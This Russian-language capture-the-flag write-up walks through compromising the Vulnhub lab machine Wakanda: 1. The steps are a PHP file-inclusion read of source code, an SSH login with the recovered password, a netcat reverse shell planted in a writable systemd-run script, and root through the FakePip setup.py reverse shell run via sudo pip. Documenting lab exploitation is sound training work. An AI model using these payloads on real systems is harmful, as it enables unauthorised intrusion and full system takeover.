# Wakanda: 1
## Vulnhub machine

- Название: Wakanda: 1
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Intermediate
- Дата релиза: 5.08.18
- Оригинальное описание: 
>A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.
Intermediate level
Flags: There are three flags (flag1.txt, flag2.txt, root.txt)
DHCP: Enabled
IP Address: Automatically assigned
Hint: Follow your intuitions ... and enumerate!
For any questions, feel free to contact me on Twitter: xMagass
Happy Hacking!


## Write-up

```html
root@kali:~# nmap -sV -sC 192.168.56.101 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-31 09:16 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.00047s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32778/udp   status
|   100024  1          46512/udp6  status
|   100024  1          47858/tcp   status
|_  100024  1          50000/tcp6  status
3333/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
MAC Address: 08:00:27:C6:69:7B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

>В целом ничего необычного, только ssh на нестандартном порте.

```html 
root@kali:~# dirb http://192.168.56.101/ /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 31 09:19:00 2020
URL_BASE: http://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/admin (CODE:200|SIZE:0)                                
+ http://192.168.56.101/backup (CODE:200|SIZE:0)                               
+ http://192.168.56.101/secret (CODE:200|SIZE:0)                               
+ http://192.168.56.101/server-status (CODE:403|SIZE:302)                      
+ http://192.168.56.101/shell (CODE:200|SIZE:0)                                
                                                                               
-----------------
END_TIME: Tue Mar 31 09:19:25 2020
DOWNLOADED: 20458 - FOUND: 5
```

>Пусто, а где не пусто, там forbidden. Но в исходнике главной страницы есть закоментированная строка:
>a class="nav-link active" href="?lang=fr">Fr/a>

>Переводит страницу на французский. Если поискать, можно найти эту статью -- https://www.securitylab.ru/analytics/485676.php
>Спустя несколько попыток, эксплуатируем LFI-уязвимость и получаем следующий результат:

```html
root@kali:~# curl http://192.168.56.101/index.php?lang=php://filter/convert.base64-enindex

PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoK
aWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/
PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJj
b250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFy
c2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdp
ZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3Jp
cHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250
ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5r
IGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJj
b3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50
ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14
LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAg
ICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5W
aWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVz
dGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhy
ZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJl
Zj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwv
aGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8
aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVh
ZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAg
ICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAg
ICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0
IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEu
IHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAg
ICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0
bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8
Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAg
ICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2Pgog
ICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
```

>Расшифруем как показано ниже, либо с помощью https://gchq.github.io/CyberChef/

```html
root@kali:~# echo "PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoK
aWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/
PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJj
b250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFy
c2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdp
ZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3Jp
cHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250
ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5r
IGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJj
b3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50
ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14
LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAg
ICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5W
aWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVz
dGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhy
ZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJl
Zj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwv
aGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8
aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVh
ZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAg
ICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAg
ICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0
IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEu
IHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAg
ICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0
bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8
Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAg
ICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2Pgog
ICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=" | base64 -d
?php
$password ="Niamey4**********" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?
```

>Получаем пароль пользователя mamadou (имя можно найти внизу главной страницы). Подключимся по ssh с указанием того самого нестандартного порта:

```html
root@kali:~# ssh mamadou@192.168.56.101 -p 3333
The authenticity of host '[192.168.56.101]:3333 ([192.168.56.101]:3333)' can't be established.
ECDSA key fingerprint is SHA256:X+fXjgH34Ta5l6I4kUSpiVZNBGGBGtjxZxgyU7KCFwk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.101]:3333' (ECDSA) to the list of known hosts.
mamadou@192.168.56.101's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> pty.spawn("/bin/bash")
mamadou@Wakanda1:~$ ls
flag1.txt
mamadou@Wakanda1:~$ cat flag1.txt
Flag : d86b9ad71ca887f4dd1dac**********
```

>Первый флаг получен, двигаемся дальше. Если долго и упорно ковыряться, можно найти файл "antivirus.py", который еще и запускается при каждом старте системы от юзера devops.

```html
mamadou@Wakanda1://srv$ ls -la
total 12
drwxr-xr-x  2 root   root      4096 Aug  1  2018 .
drwxr-xr-x 22 root   root      4096 Aug  1  2018 ..
-rw-r--rw-  1 devops developer   36 Aug  1  2018 .antivirus.py
mamadou@Wakanda1://srv$ locate antivirus
/etc/systemd/system/multi-user.target.wants/antivirus.service
/lib/systemd/system/antivirus.service
/srv/.antivirus.py
mamadou@Wakanda1://srv$ cat /lib/systemd/system/antivirus.service
[Unit]
Description=Antivirus
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=300 
User=devops
ExecStart=/usr/bin/env python /srv/.antivirus.py

[Install]
WantedBy=multi-user.target
```

>А еще его можно редачить, воспользуемся этим:
>До:

```html 
mamadou@Wakanda1://srv$ nano .antivirus.py
  GNU nano 2.2.6             File: .antivirus.py                                

open('/tmp/test','w').write('test')
```

>После:

```html
mamadou@Wakanda1://srv$ nano .antivirus.py
  GNU nano 2.2.6             File: .antivirus.py                                

open('/tmp/test','w').write('test')
import os
os.system("/bin/nc 192.168.56.109 1234 -e /bin/bash")
```

>Теперь включим слушатель и перезагрузим виртуалку:

```html
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
192.168.56.101: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.109] from (UNKNOWN) [192.168.56.101] 54996
id
uid=1001(devops) gid=1002(developer) groups=1002(developer)
```

>Теперь у нас права юзера devops, берем второй флаг:

```html
# cat home/devops/flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f8**********
```

>Остался только рут, посмотрим что мы можем запускать от него:

```html
# sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

>В этом случае нам поможет -- https://github.com/0x00-0x00/FakePip

```html
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = 'localhost'  # change this
    LPORT = 13372
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

>Меняем LHOST и LPORT, сохраняем как "setup.py" и загружаем на wakanda:

```html
# wget http://192.168.56.109:8000/setup.py
```

>Снова запускаем слушатель:

```html
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
```

>Запускаем следующую команду:  

```html
# sudo pip install . --upgrade --force-reinstall
Unpacking /home/devops
  Running setup.py (path:/tmp/pip-FeIov8-build/setup.py) egg_info for package from file:///home/devops
    
Installing collected packages: FakePip
  Running setup.py install for FakePip
```

>И получаем рут права:

```html
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.101: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.109] from (UNKNOWN) [192.168.56.101] 36039
root@Wakanda1:/tmp/pip-FeIov8-build# id

uid=0(root) gid=0(root) groups=0(root)

root@Wakanda1:/tmp/pip-FeIov8-build# cd //

root@Wakanda1://# ls

bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
root@Wakanda1://# cd  root

root@Wakanda1://root# ls

root.txt
root@Wakanda1://root# cat  root.txt

 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69**********
```
